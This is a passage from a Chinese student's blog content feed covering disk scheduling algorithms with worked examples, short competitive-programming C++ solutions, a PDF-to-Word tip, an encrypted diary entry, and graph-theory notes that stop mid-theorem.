id="磁盘高级格式化"><a href="#磁盘高级格式化" class="headerlink" title="磁盘高级格式化"></a>磁盘高级格式化</h3><p>在真正可以使用磁盘前，还需要对磁盘进行一次高级格式化，即设置   </p><ul><li>一个引导块   </li><li>空闲存储管理   </li><li>根目录   </li><li>一个空文件系统   </li><li>在分区表中标记该分区所使用的文件系统   </li></ul><h3 id="磁盘类型"><a href="#磁盘类型" class="headerlink" title="磁盘类型"></a>磁盘类型</h3><p>磁盘的类型<br>• 固定头磁盘<br>• 移动头磁盘   </p><h3 id="一次访盘请求"><a href="#一次访盘请求" class="headerlink" title="一次访盘请求"></a>一次访盘请求</h3><p>• 读/写，磁盘地址（设备号，柱面号，磁头号，扇区号），内存地址（源地址/目的地址）   </p><h4 id="磁盘访问时间—寻道时间-T-s"><a href="#磁盘访问时间—寻道时间-T-s" class="headerlink" title="磁盘访问时间—寻道时间$T_s$"></a>磁盘访问时间—寻道时间$T_s$</h4><p>把磁臂(磁头)移动到指定磁道上所经历的时间<br>$$T_s = m*n+s $$<br>m:常数，n:移动的磁道数，s:磁盘启动时间<br>一般磁盘：m=0.2<br>对高速磁盘：m≤0.l<br>磁臂的启动时间约为：2ms<br>对一般的温盘，其寻道时间将随寻道距离的增大而增加，大体上是：5〜30ms   </p><h4 id="磁盘访问时间–旋转延迟时间-T-r"><a href="#磁盘访问时间–旋转延迟时间-T-r" class="headerlink" title="磁盘访问时间–旋转延迟时间$T_r$"></a>磁盘访问时间–旋转延迟时间$T_r$</h4><p>指定扇区移动到磁头下面所经历的时间<br>$$ T_r = \frac{1}{2r} $$<br>r为磁盘转速（通常为：转速/单位时间）<br>一般使用简单的假定测量该值，<br>即使用平均值；将磁盘旋转周期的一半作为旋转延迟的近似值，<br>因此，一般都将磁盘旋转周期的一半定为旋转延迟。   </p><h4 id="数据传输时间-T-t"><a href="#数据传输时间-T-t" class="headerlink" title="数据传输时间$T_t$"></a>数据传输时间$T_t$</h4><p>把<strong>数据</strong>从磁盘<strong>读出</strong>或向磁盘<strong>写入</strong>数据所经历的时间<br>大小与毎次所读/写的字节数b和旋转速度有关<br>$$ T_t = \frac{b}{rN}$$<br>b：读写字节数； r：磁盘转速 ； N:一个磁道上的字节数<br>当一次读/写的字节数相当于半条磁道上的字节数时，即N=2×b时：<br>$$ T_t = T_r $$   </p><h4 id="磁盘访问时间-T-a"><a href="#磁盘访问时间-T-a" class="headerlink" title="磁盘访问时间$T_a$"></a>磁盘访问时间$T_a$</h4><p>访问时间=寻道时间+旋转时间+传输时间   </p><ol><li>磁盘接收到读指令后，磁头从当前位置移动到目标磁道位置，所需的时间为寻道时间   </li><li>旋转磁盘，定位数据所在的扇区，所需时间为旋转延迟时间   </li><li>从磁盘上读取数据，时间为数据传输时间   </li></ol><h4 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h4><p>设一个磁盘的平均寻道时间为20ms，传输速率是1MB/s，控制器开销是2ms，转速为每分钟5400转。<br>求读写一个512字节的扇区的平均时间？<br><font color="navy">解:<br>$$旋转延迟时间T_r=\frac{1}{2r} = \frac{1}{2*5400/60} =0.0056s=5.6ms\\<br>访问时间T_a = T_s+T_r+T_t = 20ms+5.6ms+((512/1024)/1MB/s)+2ms = 28.1ms$$<br></font>   </p><h3 id="磁盘调度"><a href="#磁盘调度" class="headerlink" title="磁盘调度"></a>磁盘调度</h3><p>当多个访盘请求在等待时，采用一定的策略，对这些请求的服务顺序调整安排，旨在降低平均磁盘服务时间，达到公平、高效<br>– 公平：一个I/O请求在有限时间内满足<br>– 高效：减少设备机械运动所带来的时间浪费，主要是使磁盘的<strong>平均寻道时间</strong>最短<br>磁盘调度的目标：<br>使磁盘的平均寻道时间最少（即平均寻道长度最短）。   </p><h4 id="共享磁盘的调度"><a href="#共享磁盘的调度" class="headerlink" title="共享磁盘的调度"></a>共享磁盘的调度</h4><p>移臂调度<br>要提高磁盘的使用效率，只能在减少查找时间和等待时间上想办法，它们都与I/O在磁盘上的分布位置有关。从减少查找时间着手，就称为磁盘的“移臂调度 ”。<br>旋转调度<br>从减少等待时间着手 从减少等待时间着手，就称为磁盘的“旋转调度”。下面只介绍移臂调度的各种算法。   </p><h4 id="先来先服务调度算法-FCFS"><a href="#先来先服务调度算法-FCFS" class="headerlink" title="先来先服务调度算法(FCFS)"></a>先来先服务调度算法(FCFS)</h4><p>基本思想：以I/O请求到达的先后次序作为磁盘调度的顺序。<br>特点：简单、较合理，但未对寻道进行优化<br>举例：<br>示例 现在假定读/写磁头位于53号柱面 开始调度时有若干<br>进程顺序提出对如下柱面的I/O请求：<br>98 183 37 122 14 124 65 67<br><img src="/images/pasted-18.png" alt="upload successful" loading="lazy"><br>总共划过的磁道数=(98-53)+(183-98)+(183-37)+(122-37)+(122-14)+(124-14)+(124-65)+(67-65)=45+85+146+85+108+110+59+2=640   </p><h4 id="最短查找时间优先调度算法（SSTF）"><a href="#最短查找时间优先调度算法（SSTF）" class="headerlink" title="最短查找时间优先调度算法（SSTF）"></a>最短查找时间优先调度算法（SSTF）</h4><p>基本思想：把距离磁头当前位置最近的I/O请求作为下一次调度的对象<br>特点：寻道性能比FCFS好，但不能保证寻道时间最短 但不能保证寻道时间最短，且有可能引起某些请求的饥饿。<br>举例：（当前53）98 183 37 122 14 124 65 67<br><img src="/images/pasted-19.png" alt="upload successful" loading="lazy"><br>总共划过的磁道数<br>=(65-53)+(67-65)+(67-37)+(37-14)+(98-14)+(122-98)+(124-122)<br>+(183-124)=12+2+30+23+84+24+2+59=236   </p><h4 id="电梯调度算法-SCAN"><a href="#电梯调度算法-SCAN" class="headerlink" title="电梯调度算法(SCAN)"></a>电梯调度算法(SCAN)</h4><p>基本思想：<br>沿着移动臂的移动方向选择距离磁头当前位置最近的I/O请求作为下一次调度的对象。如果该方向上已无I/O请求，则改变方向再做选择。<br>注意，由于电梯调度算法与移动臂的移动方向有关，因此磁臂移动的结果路线应该有两个答案。<br>举例：（当前53）98 183 37 122 14 124 65 67<br>由里往外移动<br>总共划过的磁道数<br>=(53-37)+(37-14)+(65-14)+(67-65)+(98-67)+(122-98)+(124-122)+(183-124)=16+23+51+2+31+24+2+59=208<br>由外往里移动<br>总共划过的磁道数=299   </p><h4 id="单向扫描调度算法（CSCAN）"><a href="#单向扫描调度算法（CSCAN）" class="headerlink" title="单向扫描调度算法（CSCAN）"></a>单向扫描调度算法（CSCAN）</h4><p>基本思想：<br>总是从0号柱面开始往里移动磁臂，遇到有I/O请求就进行处理，直到到达最后一个请求柱面。然后移动臂立即带动磁头不做任何服务地快速返回到0号柱面，开始下一次扫描<br>举例：（当前53）98 183 37 122 14 124 65 67<br><img src="/images/pasted-20.png" alt="upload successful" loading="lazy"><br>总共划过的磁道数=350   </p><h4 id="N步扫描"><a href="#N步扫描" class="headerlink" title="N步扫描"></a>N步扫描</h4><p>引入目的：避免磁臂粘连<br>将磁盘请求队列分成若干个长度为N的子队列，磁盘调度将按FCFS算法依次处理这些子队列，对每个队列的处理用SCAN方法<br>（注意：N的选取）<br>举例：假设磁盘访问序列为98, 183, 37, 122, 14, 124, 65, 67，新出现访问序列是45, 7, 30，读写头起始位置为53，磁头当前向磁道号增加的方向移动。<br>N步扫描（N=3）<br>» 访问序列：（98，183，37），（ 14，122，124），（67，65，45），(30，7）<br>– 总移动距离=526   </p><h4 id="N步扫描和FSCAN算法"><a href="#N步扫描和FSCAN算法" class="headerlink" title="N步扫描和FSCAN算法"></a>N步扫描和FSCAN算法</h4><p>引入目的：避免磁臂粘连<br>FSCAN算法：两个队列，一是当前请求I/O的磁盘请求队列，二是在扫描期间新出现的所有磁盘请求组成的队列。这样，所有新到达的访问请求本次不予访问，留待下次再服务。<br>举例，假设磁盘访问序列为98, 183, 37, 122, 14, 124, 65, 67，新出现访问序列是45, 7, 30，读写头起始位置为53，磁头当前向磁道号增加的方向移动<br>– FSCAN算法<br>» 访问序列 （53，65，67，98，122，124，183，37，14）（7，30，45）<br>» 总移动距离=344   </p><h4 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h4><p>假定一磁盘由100个柱面，编号位0～99，在完成了磁道43处的请求后，当前正在磁道25处进行请求服务。磁盘请求的柱面按磁盘请求的柱面按38，6，40，2，20，22，10的次序到达，寻道时每移动一个柱面需要10ms，计算以下算法的总寻道时间。<br>（1）FCFS<br>（2）SSTF<br>（3）SCAN<br>（4）CSCAN<br><font color="navy"><br>解：<br>（1）FCFS：<code>(38-25)+(38-6)+(40-6)+(40-2)+(20-2)+(22-2)+22-10)=167;167*10=1670ms</code><br>（2）SSTF：<code>(25-22)+(22-20)+(20-10)+(10-6)+(6-2)+(38-2)+(40-38)=61；61*10=610ms</code><br>（3）SCAN：<br>  由里往外：<code>(25-2)+(40-2)=61;61*10=610ms;</code><br>  由外往里：<code>(40-25)+(40-2)=53;53*10=530ms;</code><br>（4）CSCAN：<code>(40-25)+(40-0)+(22-0)=77;77*10=770ms;</code><br><font color="red">每次都向里移动（数大的地方），结束后回到0处，继续向里动   </p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>memset的使用</title>
      <link href="/2020/ACM/memset/"/>
      <url>/2020/ACM/memset/</url>
      
        <content type="html"><![CDATA[<!--more--><h2 id="memset"><a href="#memset" class="headerlink" title="memset"></a>memset</h2><p>memset是按照<strong>1个字节</strong>为单位对内存进行填充，因此memset只能初始化字节相同的数<br>比如0，-1，0x3f。</p>]]></content>
      
      
      <categories>
          
          <category> ACM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>POJ3069 Saruman&#39;s Army</title>
      <link href="/2020/ACM/POJ3069/"/>
      <url>/2020/ACM/POJ3069/</url>
      
        <content type="html"><![CDATA[<!--more--><h2 id="Saruman’s-Army-POJ3069"><a href="#Saruman’s-Army-POJ3069" class="headerlink" title="Saruman’s Army POJ3069"></a><a href="https://vjudge.net/problem/POJ-3069" target="_blank" rel="noopener">Saruman’s Army POJ3069</a></h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>先对输入的数据进行升序排序。<br>找到当前这个点的位置a[i]+r范围内最远的那个点a[j]<br>在找超出a[j]+r范围的最小的点，作为开始，直到所有点都被遍历过。<br>结束</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;cstdio></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;algorithm></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> N <span class="token operator">=</span> <span class="token number">1000</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> r<span class="token punctuation">,</span>n<span class="token punctuation">,</span>a<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span>st<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cin<span class="token operator">>></span>r<span class="token operator">>></span>n <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span>r<span class="token operator">==</span>n <span class="token operator">&amp;&amp;</span> n<span class="token operator">==</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">memset</span><span class="token punctuation">(</span>st<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>st<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            cin<span class="token operator">>></span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">sort</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>a<span class="token operator">+</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">while</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">&lt;=</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>r <span class="token operator">&amp;&amp;</span> j<span class="token operator">&lt;</span>n<span class="token punctuation">)</span>                j<span class="token operator">++</span><span class="token punctuation">;</span>            ans<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token keyword">while</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;=</span>a<span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">+</span>r <span class="token operator">&amp;&amp;</span> i<span class="token operator">&lt;</span>n<span class="token punctuation">)</span>                i<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        cout<span class="token operator">&lt;&lt;</span>ans<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ACM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 贪心 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>POJ1852 Ants</title>
      <link href="/2020/ACM/POJ1852/"/>
      <url>/2020/ACM/POJ1852/</url>
      
        <content type="html"><![CDATA[<!--more--><h2 id="Ants-POJ1852"><a href="#Ants-POJ1852" class="headerlink" title="Ants POJ1852"></a><a href="https://vjudge.net/problem/POJ-1852" target="_blank" rel="noopener">Ants POJ1852</a></h2><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;cstdio></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;algorithm></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> N <span class="token operator">=</span> <span class="token number">1000000</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> t<span class="token punctuation">,</span>a<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span>l<span class="token punctuation">,</span>n<span class="token punctuation">,</span>minc<span class="token punctuation">,</span>maxc<span class="token punctuation">;</span>    cin<span class="token operator">>></span>t<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>t<span class="token operator">--</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        minc <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        maxc <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        cin<span class="token operator">>></span>l<span class="token operator">>></span>n<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            cin<span class="token operator">>></span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            minc <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>minc<span class="token punctuation">,</span><span class="token function">min</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>l<span class="token operator">-</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            maxc <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>maxc<span class="token punctuation">,</span><span class="token function">max</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>l<span class="token operator">-</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        cout<span class="token operator">&lt;&lt;</span>minc<span class="token operator">&lt;&lt;</span><span class="token string">' '</span><span class="token operator">&lt;&lt;</span>maxc<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h2><p>这道题不难，但关键在于要好好思考，学会优化问题。<br>我们学计算机的，就是个工具人。<br>只会码代码是不行的，得学会思考，钻研，不断学习。<br>说到底，计算机能干任何一个专业的事，我们要做的就是好好运用他，找到自己喜欢的一个领域，做到极致，就是最强的<br>想起了《鬼灭之刃》里的黄毛。</p>]]></content>
      
      
      <categories>
          
          <category> ACM </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pdf转word</title>
      <link href="/2020/CS/pdf%E8%BD%ACword/"/>
      <url>/2020/CS/pdf%E8%BD%ACword/</url>
      
        <content type="html"><![CDATA[<!--more--><p>今天学习到一个pdf转word的小技巧<br>将pdf用word打开，就可以自动转换了。<br>NB<br>而且准确率也很高，基本没错的，我天</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-5-12</title>
      <link href="/2020/diary/2020-5/2020-5-12/"/>
      <url>/2020/diary/2020-5/2020-5-12/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误！" data-whm="文章校验失败！"><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="请输入密码：" /><label>请输入密码：</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="11ff039c089ce7bad2b532f7e2df09fb134ab96e78afb014008cbb3e7ed74c68">a2c307c51c957bc8cd6d67e4f581ae7f3fba0ad99d1703e6dc7af7e61fd1cf199cff7e3e31001d46642b10ce0e9b9a627d5da48216659ecd3e7b2c0d0c45b75a7774dd6ee5a556be9f1b457f1d9b0130f6bf702fc21e98bc9fd57d3318806906a2319308cdcc322f1391177b25392f79225f3a59e7654fefc45ee6d677fb756b41da50bdd3604f94a8448a7b286da9b5e7750bd7f086db0e27061cd2353cb96331cb5cfbe1478d448991228ee487e0c00b1309729d2157247761c27c9bc2f60ac84d02441dac353ef7daa439f511de709d7046d4c48e8aa04c64b259116ce3cdc7d191f973fcc5013815f6f08099f4df79812238da360a3999fe53de795fdd28acc1377591d4d88722d9e49f0271f8ad3a3fe0dc49f180e69278517ff2eefdae</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 杂思 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂思 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>离散数学-图</title>
      <link href="/2020/learning/2019-2020s/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6-%E5%9B%BE/"/>
      <url>/2020/learning/2019-2020s/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6-%E5%9B%BE/</url>
      
        <content type="html"><![CDATA[<!--more--><h2 id="图的基本概念"><a href="#图的基本概念" class="headerlink" title="图的基本概念"></a>图的基本概念</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><ol><li>无序积 A&amp;B = { {a,b} | x∈A ^ y∈B }</li><li>无向图<br>图G=&lt;V,E&gt;<br>– V≠∅ 顶点集V(G)<br>– E包含于V&amp;V 边集(多重集) E(G)</li><li>有向图<br>有向图D=&lt;V,E&gt;<br>– V≠∅, 顶点集V(D)<br>– E包含于VxV, 边集(多重集) E(D)</li><li>n阶图：|V(G)|=n</li><li>有限图：|V(G)|&lt;无穷</li><li>零图Nn ：E=∅</li><li>平凡图： 1阶零图N1</li><li>空图： V=E=∅</li><li>标定图：顶点或边带标记的图</li><li>非标定图：顶点和边不带标记的图</li><li>底图(基图)：有向图去掉边的方向后得到的无向图</li><li>相邻<br>有边相连的两个顶点是相邻的<br>有公共顶点的两条边是相邻的</li><li>邻接<br>u邻接到v, v邻接于u</li><li>关联<br>一条边的端点与这条边是关联的<br>关联次数</li><li>环：只与一个顶点关联的边</li><li>孤立点：不与任何边关联的顶点</li><li>平行边<br>– 端点相同的两条无向边是平行边<br>– 起点与终点相同的两条有向边是平行边</li><li>邻域：NG(v)={ u∈V(G) | (u,v)∈E(G)∩u≠v}</li><li>闭邻域：NG(v)=NG(v)∪{v}</li><li>关联集：IG(v) = { e | e与v关联}</li><li>后继：TD+(v)={u∈V(D)|&lt;v,u&gt;∈E(D)∩u≠v}</li><li>前驱：TD-(v)={u∈V(D)|&lt;u,v&gt;∈E(D)∩u≠v}</li><li>(闭)邻域：ND(v)=TD+(v)∪TD-(v)  ND(v)=ND(v)∪{v}</li><li>度：dG(v) = 与v关联的边的次数之和<br>出度：dD+(v) =与v关联的出边的次数之和<br>入度：dD-(v) =与v关联的入边的次数之和<br>度：dD(v) = dD+(v) + dD-(v)<br>最大度△(G) = max{ dG(v) | v∈V(G) }<br>最小度δ(G) = min{ dG(v) | v∈V(G) }<br>最大出度△+(D) = max{ dD+(v) | v∈V(D)<br>最小出度δ+(D) = min{ dD+(v) | v∈V(D) }<br>最大入度△-(D) = max{ dD-(v) | v∈V(D)<br>最小入度δ-(D) = min{ dD-(v) | v∈V(D) }</li><li>简单图：既无环也无平行边的图 =&gt;0 &lt;= △(G) &lt;= n-1</li><li>k-正则图：所有顶点的度都是k</li><li>度数列<br>设G=&lt;V,E&gt;,V={v1,v2,…,vn}, 称d = ( d(v1),d(v2),…, d(vn) )为G的度数列    </li><li>可图化<br>设非负整数列d=( d1,d2, …, dn ), 若存在图G, 使得G的度数列是d, 则称d为可图化的</li><li>可简单图化<br>设非负整数列d=( d1, d2, …, dn ), 若存在简单图G, 使得G的度数列是d, 则称d为可简单图化的</li><li>图同构<br>无向图G1=&lt;V1,E1&gt;, G2=&lt;V2,E2&gt;，若存在双射f:V1-&gt;V2<br>满足任意u,v∈V1，(u,v)∈E1 &lt;-&gt; (f(u),f(v))∈E2 ，<br>则称G1与G2同构,</li><li>图族<ul><li>完全图</li><li>有向完全图</li><li>竞赛图</li><li>柏拉图图（正n面体图）</li><li>彼德森图</li><li>r部图</li><li>二部图(偶图)  <code>G=&lt;V1,V2; E&gt;</code><br>设G=(V,E)是一个无向图，如果顶点V可分割为两个互不相交的子集(A,B)，并且图中的每条边（i，j）所关联的两个顶点i和j分别属于这两个不同的顶点集(i in A,j in B)，则称图G为一个二分图。</li><li>完全r部图 </li><li>超立方体</li><li>子图</li><li>生成子图</li><li>导出子图</li><li>补图</li><li>自补图</li></ul></li></ol><h3 id="基本定理"><a href="#基本定理" class="headerlink" title="基本定理"></a>基本定理</h3><ol><li>图论基本定理(握手定理)<br>设G=&lt;V,E&gt;是无向图,V={v1,v2,…,vn}, |E|=m, 则d(v1)+d(v2)+…+d(vn)=2m.<br>任何图中奇度顶点的个数是偶数.<br>设D=&lt;V,E&gt;是有向图, V={v1,v2,…,vn},|E|=m, 则<br>d+(v1)+d+(v2)+…+d+(vn)= d-(v1)+d-(v2) +…+d-(vn) = m</li><li>可图化充要条件<br>非负整数列d=(d1,d2,…,dn)可图化 &lt;=&gt; d1+d2+…+dn = 0 (mod 2).</li><li>可简单图化充要条件(Havel定理)<br>设非负整数列d=(d1,d2,…,dn)满足:<br>d1+d2+…+dn = 0(mod 2),<br>n-1&gt;=d1&gt;=d2&gt;=…&gt;=dn&gt;=0,<br>则d可简单图化&lt;=&gt;<br>d’=(d2-1,d3-1,…,d_(d1+1)-1,d_(d1+2),…,dn)</li><li>可简单图化充要条件<br>定理7.4(P.Erdös,T.Gallai,1960):<br>设非负整数列d=(d1,d2,…,dn)满足:<br>n-1&gt;=d1&gt;=d2&gt;=…&gt;=dn&gt;=0,<br>则d可简单图化&lt;=&gt;<br>d1+d2+…+dn=0(mod 2)<br>并且对r=1,2,…,n-1有<br>d1+d2+…+dr &lt;= r(r-1)+min{r,d_(r+1)}+ min{r,d_(r+2)}+…+min{r,dn}.</li></ol><h3 id="图的运算"><a href="#图的运算" class="headerlink" title="图的运算"></a>图的运算</h3><ol><li>删除</li><li>收缩、加新边</li><li>不交</li><li>并图</li><li>交图</li><li>差图</li><li>环和</li><li>联图</li><li>积图</li></ol><h2 id="通路与回路"><a href="#通路与回路" class="headerlink" title="通路与回路"></a>通路与回路</h2><h3 id="基本概念-1"><a href="#基本概念-1" class="headerlink" title="基本概念"></a>基本概念</h3><ol><li>通路(walk) 顶点与边的交替序列<br>起点, 终点, 通路长度</li><li>回路 起点=终点的通路</li><li>简单通路: 没有重复边的通路</li><li>简单回路: 没有重复边的回路</li><li>复杂通路: 有重复边的通路</li><li>复杂回路: 有重复边的回路</li><li>初级通路(路径): 没有重复顶点的通路</li><li>初级回路(圈): 没有重复顶点的回路<br>周长：最长圈的长度<br>围长：含圈的无向简单图中最短圈的长度</li><li>通(回)路的表示<br>可以只用边的序列来表示通(回)路<br>简单图可以只用顶点的序列来表示通(回)路</li><li>极大路径<br>在无向简单图中, 路径的两个端点不与路径本身以外的顶点相邻, 这样的路径称为极大路径<br>在有向图中, 路径起点的前驱,终点的后继,都在路径本身上</li></ol><h3 id="基本定理-1"><a href="#基本定理-1" class="headerlink" title="基本定理"></a>基本定理</h3><ol><li>定理7.6  在n阶(有向或无向)图G中,若从不同顶点vi到vj有通路, 则从vi到vj有长度小于等于n-1的通路<br>推论：在n阶图G中,若从不同顶点vi到vj有通路,则从vi到vj有长度小于等于n-1的路径(初级通路).</li><li>定理7.7 在n阶图G中,若有从顶点vi到自身的回路,则有从vi到自身长度小于等于n的回路.<br>推论：在n阶图G中,若有从顶点vi到自身的简单回路, 则有从vi到自身长度小于等于n的圈(初级回路).</li><li>扩大路径法<br>任何一条路径,只要不是极大路径,则至少有一个端点与路径本身以外的顶点相邻, 则路径还可以扩大,直到变成极大路径为止</li></ol><h2 id="无向图的连通性"><a href="#无向图的连通性" class="headerlink" title="无向图的连通性"></a>无向图的连通性</h2><h3 id="基本概念-2"><a href="#基本概念-2" class="headerlink" title="基本概念"></a>基本概念</h3><ol><li>连通</li></ol><h2 id="欧拉图"><a href="#欧拉图" class="headerlink" title="欧拉图"></a>欧拉图</h2><h3 id="七桥问题"><a href="#七桥问题" class="headerlink" title="七桥问题"></a>七桥问题</h3><p>一笔画问题</p><h3 id="基本概念-3"><a href="#基本概念-3" class="headerlink" title="基本概念"></a>基本概念</h3><ol><li>欧拉通路：经过图中所有边的简单通路</li><li>半欧拉图：有欧拉通路的图</li><li>欧拉回路：经过图中所有边的简单回路</li><li>欧拉图：有欧拉回路的图</li></ol><h3 id="定理"><a href="#定理" class="headerlink" title="定理"></a>定理</h3><ol><li>无向欧拉图的充分必要条件<br>定理8.1: 设G是无向连通图,则G是欧拉图(1)<br>&lt;=&gt; G中所有顶点都是偶数度(2)<br>&lt;=&gt; G是若干个边不交的圈的并(3)<br>证明:<br>(1)=&gt;(2) 若欧拉回路总共k次经过顶点v, 则d(v)=2k.<br>(2)=&gt;(3)若删除任意1个圈上的边,则所有顶点的度还是偶数, 但是不一定连通了.对每个连通分支重复进行.<br>(3)=&gt;(1)有公共点但边不交的简单回路, 总可以拼接成欧拉回路: 在交点处,走完第1个回路后再走第2个回路.    </li><li>无向半欧拉图的充分必要条件<br>定理8.2: 设G是无向连通图,则(1) 